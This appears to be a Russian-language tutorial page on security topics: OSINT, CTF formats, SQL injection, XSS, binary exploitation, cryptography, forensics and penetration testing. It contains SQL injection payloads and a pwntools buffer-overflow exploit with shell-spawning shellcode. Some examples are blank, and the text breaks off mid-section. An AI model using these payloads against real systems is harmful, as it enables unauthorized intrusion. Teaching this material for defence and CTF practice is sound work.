OSINT: Открытая разведка

OSINT (Open Source Intelligence) - сбор и анализ информации из открытых источников. Используется спецслужбами, журналистами, хакерами и исследователями безопасности.

Методы OSINT

Поиск по соцсетям

  • Анализ профилей и связей
  • Геолокация по фотографиям
  • Поиск по никнеймам
  • Анализ метаданных
# Инструмент Sherlock для поиска по никнеймам
git clone https://github.com/sherlock-project/sherlock.git
cd sherlock
python3 sherlock.py username

Технический анализ

  • Поиск уязвимых систем
  • Анализ DNS записей
  • Поиск открытых портов
  • Сканирование сетей
# Поиск поддоменов с помощью Sublist3r
python3 sublist3r.py -d example.com

Работа с документами

  • Извлечение метаданных
  • Поиск в государственных реестрах
  • Анализ судебных дел
  • Работа с архивами
# Извлечение метаданных из файла
exiftool document.pdf

Защита от OSINT

  • Ограничьте публичную информацию в соцсетях
  • Используйте разные никнеймы для разных сервисов
  • Очищайте метаданные перед публикацией файлов
  • Регулярно проверяйте, какая информация о вас доступна
  • Используйте VPN и приватные режимы браузеров

CTF: Capture The Flag

CTF (Capture The Flag) - соревнования по информационной безопасности, где участники решают задачи из различных областей для получения "флагов".

Типы CTF

Jeopardy

Классический формат с задачами разных категорий:

  • Web
  • Crypto
  • Forensics
  • Pwn
  • Reversing

Attack-Defense

Команды защищают свои системы и атакуют чужие:

  • Реальные уязвимости
  • Постоянное взаимодействие
  • Высокая динамика

Mixed

Комбинированный формат:

  • Jeopardy + Attack-Defense
  • Разнообразие задач
  • Командное взаимодействие

Категории задач

Категория Описание Пример флага
Web Эксплуатация уязвимостей веб-приложений flag{sql_injection_101}
Crypto Взлом криптографических алгоритмов flag{RSA_15_34sy}
Forensics Анализ данных и восстановление информации flag{h1dd3n_1n_png}
Pwn Эксплуатация бинарных уязвимостей flag{buff3r_0v3rfl0w}
Reversing Обратная разработка программ flag{m41n_func_1337}

SQL-инъекции

SQL-инъекции позволяют выполнять произвольные SQL-запросы через входные данные приложения.

Основы
UNION-атаки
Слепые инъекции

Простейшая SQL-инъекция:

# Оригинальный запрос
SELECT * FROM users WHERE username = '[input]' AND password = '[input]'

# Вредоносный ввод
username: ' OR 1=1 --
password: 

# Итоговый запрос
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = ''

UNION-атаки позволяют извлекать данные из других таблиц:

# Определение количества столбцов
' ORDER BY 1–
' ORDER BY 2–
' ORDER BY 3–  # Возвращает ошибку => 2 столбца

# UNION-атака
' UNION SELECT username, password FROM users--

Слепые SQL-инъекции используются, когда результаты не видны напрямую:

# Основано на времени
'; IF (1=1) WAITFOR DELAY '0:0:5'--

# Основано на логике
' AND 1=1 --  # Приложение работает нормально
' AND 1=2 --  # Приложение ведёт себя иначе

Защита от SQL-инъекций

  • Используйте подготовленные выражения (prepared statements)
  • Применяйте ORM-библиотеки
  • Экранируйте специальные символы
  • Ограничивайте права доступа БД
  • Используйте WAF (Web Application Firewall)

XSS (Cross-Site Scripting)

XSS позволяет внедрять произвольный JavaScript код в страницы, просматриваемые другими пользователями.

Reflected XSS

Код внедряется через параметры URL и выполняется сразу:

http://example.com/search?q=

Stored XSS

Код сохраняется на сервере и выполняется при каждом открытии страницы:

DOM-based XSS

Код выполняется через манипуляции с DOM без отправки на сервер:

document.write(location.hash.substring(1))

Защита от XSS

  • Экранируйте HTML-сущности (< > & ")
  • Используйте Content Security Policy (CSP)
  • Устанавливайте HttpOnly флаг для куки
  • Проводите санитизацию ввода
  • Используйте современные фреймворки с защитой от XSS

Бинарный анализ и эксплуатация

Бинарный анализ - исследование исполняемых файлов без исходного кода. Включает реверс-инжиниринг и эксплуатацию уязвимостей.

Основные уязвимости

Уязвимость Описание Пример
Buffer Overflow Переполнение буфера с перезаписью адреса возврата gets(), strcpy()
Format String Уязвимости форматных строк printf(user_input)
Use-After-Free Использование освобожденной памяти Неосторожная работа с указателями
Race Condition Состояние гонки между потоками TOCTOU атаки

pwntools

Библиотека Python для эксплуатации уязвимостей

from pwn import *
p = process('./binary')
p.sendlineafter(':', 'A'*100)
p.interactive()

Пример эксплуатации Buffer Overflow

  1. Найти переполнение с помощью фаззера
  2. Определить смещение до адреса возврата
  3. Найти адрес полезной нагрузки (shellcode)
  4. Перезаписать адрес возврата
  5. Получить shell
# Пример эксплойта на pwntools
from pwn import *

context(arch='i386', os='linux')
p = process('./vuln')

offset = 112
junk = b'A' * offset
ret_addr = p32(0xffffd500)  # Адрес shellcode
nop_sled = b'\x90' * 100
shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

payload = junk + ret_addr + nop_sled + shellcode
p.sendline(payload)
p.interactive()

Криптография

Криптография - наука о методах обеспечения конфиденциальности, целостности и аутентичности информации.

Основные алгоритмы

Симметричное шифрование

  • AES (Advanced Encryption Standard)
  • DES (Data Encryption Standard)
  • Blowfish
  • ChaCha20

Асимметричное шифрование

  • RSA (Rivest-Shamir-Adleman)
  • ECC (Elliptic Curve Cryptography)
  • DH (Diffie-Hellman)

Хеш-функции

  • SHA-256
  • MD5 (небезопасен)
  • Bcrypt
  • Argon2

Примеры уязвимостей

Шифр Цезаря Easy

1. Сдвиг на 3 символа назад
2. Получаем: hello world

RSA с малым модулем Medium

Дано: n=437, e=5, c=347

Попробуйте факторизовать n и найти d

1. Факторизуем n: 437 = 19 * 23
2. φ(n) = (19-1)*(23-1) = 396
3. Находим d: d ≡ e⁻¹ mod φ(n) = 317
4. Расшифровываем: m ≡ cᵈ mod n = 347³¹⁷ mod 437 = 42
5. Флаг: flag{42}

Компьютерная форензика

Компьютерная форензика - сбор и анализ цифровых доказательств для расследования инцидентов.

Основные направления

Дисковая форензика

  • Анализ файловых систем
  • Восстановление удаленных данных
  • Поиск артефактов

Сетевая форензика

  • Анализ сетевого трафика
  • Исследование атак
  • Выявление вредоносной активности

Памятьная форензика

  • Анализ дампов памяти
  • Поиск процессов и открытых соединений
  • Извлечение паролей и ключей

Реверс-инжиниринг

Реверс-инжиниринг - процесс анализа программы для понимания её работы без доступа к исходному коду.

Основные техники

  • Статический анализ: Исследование кода без выполнения
  • Динамический анализ: Исследование во время выполнения
  • Декомпиляция: Преобразование бинарного кода в псевдокод
  • Патчинг: Модификация исполняемого файла

Тестирование на проникновение

Тестирование на проникновение (pentest) - имитация атак для выявления уязвимостей в системе.

Этапы pentest

  1. Разведка: Сбор информации о цели
  2. Сканирование: Поиск открытых портов и сервисов
  3. Получение доступа: Эксплуатация уязвимостей
  4. Удержание доступа: Сохранение доступа к системе
  5. Анализ следов: Очистка логов и отчетность

Методики

Black Box

Тестирование без знания внутренней структуры

White Box

Тестирование с полным знанием системы

Gray Box
